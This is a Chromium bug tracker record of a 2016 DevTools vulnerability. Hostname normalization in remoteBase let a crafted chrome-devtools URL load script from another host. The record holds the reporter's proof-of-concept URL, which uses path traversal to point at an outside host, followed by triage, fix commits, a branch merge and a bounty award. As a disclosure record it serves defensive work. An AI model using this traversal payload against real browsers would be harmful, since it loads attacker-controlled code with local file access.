# Security: Devtools has Insuffient sanitization of remoteBase parameter

| Field | Value |
|-------|-------|
| **Issue ID** | [40084557](https://issues.chromium.org/issues/40084557) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Platform>DevTools>Extensions |
| **Reporter** | gr...@gmail.com |
| **Assignee** | dg...@chromium.org |
| **Created** | 2016-06-12 |
| **Bounty** | $2,000.00 |

## Description

**VULNERABILITY DETAILS**  

Same vulnerability as <https://crbug.com/chromium/571121>. Fix for that issue is insufficient, as the sanitization process only checks if remoteBase URL starts with "<https://chrome-devtools-frontend.appspot.com/>". However, the loadScriptsPromise() that loads the remote screencast\_module.js, normalizes the URL before fetching the remote JS file. The vulnerability is in the process of normalization. The normalizePath() function (possibly intended only to normalize the path component of a URL by removing ".." and "." components), gets passed an input that contains the host component along with path (ie. full URL excluding scheme). This allows an attacker to remove the "chrome-devtools-frontend.appspot.com" hostname, and replace with a malicious hostname and path.

ie. normalizePath() normalizes "chrome-devtools-frontend.appspot.com/../lock.cmpxchg8b.com/xour2Iab/" to "lock.cmpxchg8b.com/xour2Iab/".

**VERSION**  

Chrome Version: 51.0.2704.84 m [stable]  

Operating System: All

**REPRODUCTION CASE** (PoC for Windows)

1. Navigate to chrome-devtools://devtools/bundled/inspector.html?remoteBase=<https://chrome-devtools-frontend.appspot.com/../lock.cmpxchg8b.com/xour2Iab/&remoteFrontend=true>  
   
   (re-using the Tavis's PoC remoteBase from <https://crbug.com/chromium/571121>)
2. If a blank screen is show, Please reload the page. This usually happens if DevToolsAPI object is not exposed to the scripts on initial load, but does on refreshes. It can be achieved programmatically by triggering the reload via remote JS [not done in PoC].

## Timeline

### np...@chromium.org (2016-06-13)

Thanks for the report. I can repro this on Win M51 stable -- it gives a dir listing of C:\ after I reloaded it.

Marking it as medium severity since it's similar to http://crbug.com/618333.

[Monorail components: Platform>DevTools>Platform]

### np...@chromium.org (2016-06-13)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### gr...@gmail.com (2016-06-15)

Isn't the label supposed to be "Security_Impact-Stable" ? Stable channel is indeed affected by this issue [as confirmed in https://crbug.com/chromium/619414#c1].

### mb...@chromium.org (2016-06-15)

Didn't verify this personally, but based on the comments here it would seem so.

### bu...@chromium.org (2016-06-20)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/554517a4587bfb0071bcd3c7eff6645a0b06d72a

commit 554517a4587bfb0071bcd3c7eff6645a0b06d72a
Author: dgozman <dgozman@chromium.org>
Date: Mon Jun 20 20:33:22 2016

[DevTools] Whitelist remoteFrontendUrl and remoteBase params.

This also fixes loadScriptsPromise to not normalize hostname.

BUG=619414,618333

Review-Url: https://codereview.chromium.org/2065823004
Cr-Commit-Position: refs/heads/master@{#400768}

[modify] https://crrev.com/554517a4587bfb0071bcd3c7eff6645a0b06d72a/third_party/WebKit/Source/devtools/front_end/Runtime.js
[modify] https://crrev.com/554517a4587bfb0071bcd3c7eff6645a0b06d72a/third_party/WebKit/Source/devtools/front_end/devtools.js


### sh...@chromium.org (2016-06-27)

dgozman: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2016-06-28)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-29)

[Empty comment from Monorail migration]

### gr...@gmail.com (2016-07-04)

FYI - One more Attack vector (besides malicious extension; copy-pasting URLs) is by sending a crafted chrome-devtools link via "Google Tone" extension. The extension allows sending URLs of any schemes to nearby machines.

### aw...@chromium.org (2016-07-14)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-07-19)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-07-21)

[Empty comment from Monorail migration]

### go...@chromium.org (2016-07-21)

Before we approve merge to M53, Could you please confirm whether this change is baked/verified in Canary and safe to merge?

Also is this change applicable to all OS or any specific OS?

### go...@chromium.org (2016-07-22)

dgozman@, please reply to https://crbug.com/chromium/619414#c16.

+awhalley@ whether to take this merge in for M53 Dev release on Tuesday (07/26).

### dg...@chromium.org (2016-07-22)

The fix has landed as r400768, which is way before M53 was branched (r403382).

### aw...@chromium.org (2016-07-22)

This is already in M53.  It's also baked enough for M52 merge.

### go...@chromium.org (2016-07-22)

Approving merge to M52 branch 2743 based on https://crbug.com/chromium/619414#c19. Please merge ASAP (latest by 5:00 PM PDT Monday) so we can take it for next week M52 Stable release. Thank you.

### bu...@chromium.org (2016-07-23)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/2f0798392134f38c8c68a7911ab622dc128775e3

commit 2f0798392134f38c8c68a7911ab622dc128775e3
Author: Dmitry Gozman <dgozman@chromium.org>
Date: Sat Jul 23 00:31:46 2016

Merge to 2743 "[DevTools] Whitelist remoteFrontendUrl and remoteBase params."
> [DevTools] Whitelist remoteFrontendUrl and remoteBase params.
>
> This also fixes loadScriptsPromise to not normalize hostname.
>
> BUG=619414,618333
>
> Review-Url: https://codereview.chromium.org/2065823004
> Cr-Commit-Position: refs/heads/master@{#400768}
(cherry picked from commit 554517a4587bfb0071bcd3c7eff6645a0b06d72a)
TBR=pfeldman

Review URL: https://codereview.chromium.org/2179623002 .

Cr-Commit-Position: refs/branch-heads/2743@{#694}
Cr-Branched-From: 2b3ae3b8090361f8af5a611712fc1a5ab2de53cb-refs/heads/master@{#394939}

[modify] https://crrev.com/2f0798392134f38c8c68a7911ab622dc128775e3/third_party/WebKit/Source/devtools/front_end/Runtime.js
[modify] https://crrev.com/2f0798392134f38c8c68a7911ab622dc128775e3/third_party/WebKit/Source/devtools/front_end/devtools.js


### aw...@chromium.org (2016-07-25)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-08-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-08-02)

And $1,000 for this one too.

### aw...@chromium.org (2016-08-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-08-04)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-08-10)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-08-24)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-08-26)

Updating reward amount.

### sh...@chromium.org (2016-10-05)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/619414?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail mergedwith: crbug.com/chromium/621567]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40084557)*
